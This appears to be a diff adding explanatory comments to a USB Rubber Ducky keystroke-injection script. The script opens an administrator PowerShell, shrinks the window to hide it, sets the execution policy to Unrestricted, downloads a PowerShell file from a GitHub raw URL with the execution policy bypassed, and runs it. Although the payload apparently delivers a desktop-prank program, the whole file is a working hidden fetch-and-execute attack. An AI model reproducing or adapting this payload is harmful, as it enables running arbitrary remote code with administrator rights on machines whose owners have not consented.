@@ -1,18 +1,24 @@
+REM --> Brings up quick access menu 
 WINDOWS x
+REM --> Brings up powershell admin
 STRING a
 DELAY 1
 LEFTARROW
 ENTER
 DELAY 1
+REM --> make window small
 STRING mode con:cols=18 lines=1
 ENTER
+REM --> Allows powershell scripts to be run, is set back to restricted in ps1 file after
 STRING Set-ExecutionPolicy -scope CurrentUser Unrestricted
 ENTER
 DELAY 1
 STRING Y
 ENTER
+REM --> Downloads ps1 file
 STRING powershell -exec bypass -c "(new-object net.webclient).DownloadFile('https://raw.githubusercontent.com/csandoval63/GooseDesktopRubberDucky/master/helloGoose.PS1','helloGoose.ps1')"
 ENTER
+REM --> runs ps1 file
 STRING ./helloGoose.ps1 "parameter title"
 ENTER
 STRING exit
